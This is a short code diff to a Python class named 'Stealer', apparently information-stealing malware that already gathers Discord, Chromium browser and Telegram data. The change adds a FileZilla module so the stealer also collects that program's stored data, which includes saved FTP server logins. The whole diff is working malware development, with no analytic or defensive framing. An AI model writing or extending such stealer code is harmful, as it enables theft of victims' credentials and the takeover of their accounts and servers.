@@ -11,6 +11,7 @@ from .modules.system import System
 from .modules.discord import Discord
 from .modules.browser import Chromium
 from .modules.telegram import Telegram
+from .modules.filezilla import FileZilla
 
 
 class Stealer(Thread):
@@ -107,6 +108,14 @@ class Stealer(Thread):
                     self.config.StoragePath,
                     r"Programs\Telegram",
                     (self.telegram,),
+                    self.errors
+                )
+            },
+            {
+                "object": FileZilla(
+                    self.config.StoragePath,
+                    r"Programs\FileZilla",
+                    (self.filezilla,),
                     self.errors
                 )
             }
